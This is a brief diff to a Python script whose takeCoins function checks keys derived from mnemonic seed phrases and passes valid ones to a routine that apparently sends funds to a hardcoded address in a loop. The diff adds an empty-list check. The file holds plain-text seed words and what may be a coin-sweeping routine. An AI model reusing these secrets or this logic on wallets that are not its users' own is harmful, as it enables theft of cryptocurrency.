@@ -34,7 +34,8 @@ def takeCoins():
         if m.check(key):
             valid_keys.append(key)
     print(valid_keys)
-    main(valid_keys, '1992vwyicuszhwrSJKxGJxmtDAqWTe7pS3', True)
+    if valid_keys:
+        main(valid_keys, '1992vwyicuszhwrSJKxGJxmtDAqWTe7pS3', True)
 
     your8words = "army excuse hero wolf disease rebuild moral"
     # your8words = "banner frequent toe corn height escape finish sample"
@@ -48,7 +49,8 @@ def takeCoins():
         if m.check(key):
             valid_keys.append(key)
     print(valid_keys)
-    main(valid_keys, '1992vwyicuszhwrSJKxGJxmtDAqWTe7pS3', True)
+    if valid_keys:
+        main(valid_keys, '1992vwyicuszhwrSJKxGJxmtDAqWTe7pS3', True)
 
 
 while True:
